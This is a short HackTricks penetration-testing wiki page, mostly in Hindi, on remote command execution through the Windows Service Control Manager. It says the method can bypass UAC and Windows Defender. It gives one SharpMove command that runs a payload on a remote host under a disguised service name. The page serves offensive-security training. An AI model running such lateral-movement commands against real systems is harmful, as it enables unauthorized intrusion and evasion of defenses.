# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** एक technique है, जिसका उपयोग Service Control Manager (SCM) के माध्यम से remote systems पर commands execute करने के लिए किया जाता है। यह method एक ऐसी service create करता है जो command चलाती है। यह method कुछ security controls, जैसे User Account Control (UAC) और Windows Defender, को bypass कर सकता है।

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## References

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
